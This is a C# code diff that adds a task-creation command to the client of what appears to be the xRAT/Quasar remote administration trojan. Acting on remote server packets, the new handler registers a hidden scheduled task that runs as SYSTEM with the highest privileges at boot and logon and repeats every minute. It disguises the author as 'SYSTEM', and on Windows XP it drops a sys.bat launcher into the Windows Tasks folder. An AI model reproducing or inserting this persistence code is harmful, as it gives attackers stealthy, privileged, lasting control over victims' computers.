@@ -4,6 +4,10 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+using System.Security.Principal;
+using System.Text;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Config;
@@ -12,7 +16,10 @@ using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
+using xClient.Core.Utilities.TaskScheduler;
 using xClient.Enums;
+
+using LegacyTS = xClient.Core.Utilities.TaskScheduler.Legacy;
 
 namespace xClient.Core.Commands
 {
@@ -489,6 +496,192 @@ namespace xClient.Core.Commands
         {
             if (_shell != null)
                 _shell.Dispose();
+        }
+
+        enum SID_NAME_USE
+        {
+            SidTypeUser = 1,
+            SidTypeGroup,
+            SidTypeDomain,
+            SidTypeAlias,
+            SidTypeWellKnownGroup,
+            SidTypeDeletedAccount,
+            SidTypeInvalid,
+            SidTypeUnknown,
+            SidTypeComputer
+        }
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool LookupAccountSid(
+           string lpSystemName,
+           [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
+           System.Text.StringBuilder lpName,
+           ref uint cchName,
+           System.Text.StringBuilder ReferencedDomainName,
+           ref uint cchReferencedDomainName,
+           out SID_NAME_USE peUse);
+
+        public static void HandleCreateTask(Packets.ServerPackets.DoCreateTask command, Client client)
+        {
+            if (WindowsAccountHelper.GetAccountType() != "Admin")
+            {
+                new Packets.ClientPackets.SetStatus("Failed to create task: must be administrator.").Execute(client);
+                return;
+            }
+
+            var name = new StringBuilder();
+            var cchName = (uint)name.Capacity;
+            var referencedDomainName = new StringBuilder();
+            var cchReferencedDomainName = (uint)referencedDomainName.Capacity;
+            SID_NAME_USE sidUse;
+
+            var sid = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
+            var sidBuff = new byte[sid.BinaryLength];
+            sid.GetBinaryForm(sidBuff, 0);
+
+            if (!LookupAccountSid(null, sidBuff, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
+            {
+                var err = Marshal.GetLastWin32Error();
+                if (err == 122 /* ERROR_INSUFFICIENT_BUFFER */)
+                {
+                    name.EnsureCapacity((int)cchName);
+                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
+                    if (!LookupAccountSid(null, sidBuff, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
+                    {
+                        new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", Marshal.GetLastWin32Error())).Execute(client);
+                        return;
+                    }
+                }
+            }
+
+            try
+            {
+                // If we're on Windows XP we need to use the Task Scheduler 1.0 interface
+                if (PlatformHelper.XpOrHigher && !PlatformHelper.VistaOrHigher)
+                {
+                    var sched = new LegacyTS.CTaskScheduler() as LegacyTS.ITaskScheduler;
+
+                    if (sched == null)
+                    {
+                        new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
+                        return;
+                    }
+
+                    var taskGuid = Marshal.GenerateGuidForType(typeof(LegacyTS.ITask));
+                    var cTaskGuid = Marshal.GenerateGuidForType(typeof(LegacyTS.CTask));
+                    object taskObj;
+                    sched.NewWorkItem(command.TaskName, ref cTaskGuid, ref taskGuid, out taskObj);
+                    var task = (LegacyTS.ITask) taskObj;
+
+                    task.SetApplicationName(
+                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") +
+                        "\\sys.bat");
+                    task.SetParameters(command.Arguments ?? "");
+                    task.SetComment("");
+                    task.SetCreator(name.ToString());
+                    task.SetWorkingDirectory("");
+
+                    var pwd = Marshal.StringToCoTaskMemUni(null);
+                    task.SetAccountInformation("", pwd);
+                    Marshal.FreeCoTaskMem(pwd);
+                    task.SetIdleWait(10, 20);
+                    task.SetMaxRunTime((uint) new TimeSpan(1, 0, 0).TotalMilliseconds);
+                    task.SetPriority((uint) ProcessPriorityClass.High);
+
+                    ushort triggerIdx;
+                    LegacyTS.ITaskTrigger iTrigger;
+                    task.CreateTrigger(out triggerIdx, out iTrigger);
+
+                    // Boot trigger
+                    var trigger = new LegacyTS.TaskTrigger();
+                    iTrigger.GetTrigger(ref trigger);
+                    trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_SYSTEMSTART;
+                    trigger.TriggerSize = (ushort) Marshal.SizeOf(trigger);
+                    trigger.BeginYear = (ushort) DateTime.Today.Year;
+                    trigger.BeginMonth = (ushort) DateTime.Today.Month;
+                    trigger.BeginDay = (ushort) DateTime.Today.Day;
+                    // Remove "Disabled" flag
+                    trigger.Flags &= ~(uint) 0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
+
+                    iTrigger.SetTrigger(ref trigger);
+                    task.CreateTrigger(out triggerIdx, out iTrigger);
+
+                    // Logon trigger
+                    trigger = new LegacyTS.TaskTrigger();
+                    iTrigger.GetTrigger(ref trigger);
+                    trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_LOGON;
+                    trigger.TriggerSize = (ushort) Marshal.SizeOf(trigger);
+                    trigger.BeginYear = (ushort) DateTime.Today.Year;
+                    trigger.BeginMonth = (ushort) DateTime.Today.Month;
+                    trigger.BeginDay = (ushort) DateTime.Today.Day;
+                    // Remove "Disabled" flag
+                    trigger.Flags &= ~(uint) 0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
+
+                    iTrigger.SetTrigger(ref trigger);
+
+                    var iFile = (IPersistFile) task;
+                    iFile.Save(null, false);
+
+                    // Create a small batch file to delay
+                    File.WriteAllText(
+                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") +
+                        "\\sys.bat",
+                        string.Format("ping 127.0.0.1 -n 180 > nul{0}start\"{1}\"", Environment.NewLine, command.Path));
+                }
+                // Else we use Task Scheduler 2.0
+                else if (PlatformHelper.VistaOrHigher)
+                {
+                    var sched = new TaskScheduler();
+                    sched.Connect();
+
+                    if (!sched.Connected)
+                    {
+                        new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
+                        return;
+                    }
+
+                    var folder = sched.GetFolder("\\");
+                    var task = sched.NewTask(0);
+                    task.RegistrationInfo.Author = "SYSTEM";
+                    task.Principal.RunLevel = TaskRunLevel.Highest;
+
+                    task.Settings.StartWhenAvailable = true;
+                    task.Settings.DisallowStartIfOnBatteries = false;
+                    task.Settings.StopIfGoingOnBatteries = false;
+                    task.Settings.ExecutionTimeLimit = "PT0S";
+                    task.Settings.Hidden = true;
+
+                    task.Principal.UserId = name.ToString();
+
+                    task.Triggers.Create(TaskTriggerType.Logon);
+                    var bootTrigger = (IBootTrigger) task.Triggers.Create(TaskTriggerType.Boot);
+                    var execAction = (IExecAction) task.Actions.Create(TaskActionType.Execute);
+
+                    bootTrigger.Id = "AnyLogon";
+                    bootTrigger.Delay = "PT1M";
+                    bootTrigger.Repetition.Interval = "PT1M";
+                    bootTrigger.Repetition.Duration = "PT13M";
+                    bootTrigger.Repetition.StopAtDurationEnd = true;
+
+                    execAction.Path = command.Path ?? "";
+                    execAction.Arguments = command.Arguments;
+
+                    folder.RegisterTaskDefinition(command.TaskName, task, 6 /* TASK_CREATE_OR_UPDATE */, null, null,
+                        TaskLogonType.InteractiveTokenOrPassword);
+                }
+            }
+            catch (COMException e)
+            {
+                new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", e.ErrorCode))
+                    .Execute(client);
+                return;
+            }
+            catch
+            {
+                new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
+                return;
+            }
+            new Packets.ClientPackets.SetStatus("Created task.").Execute(client);
         }
     }
 }
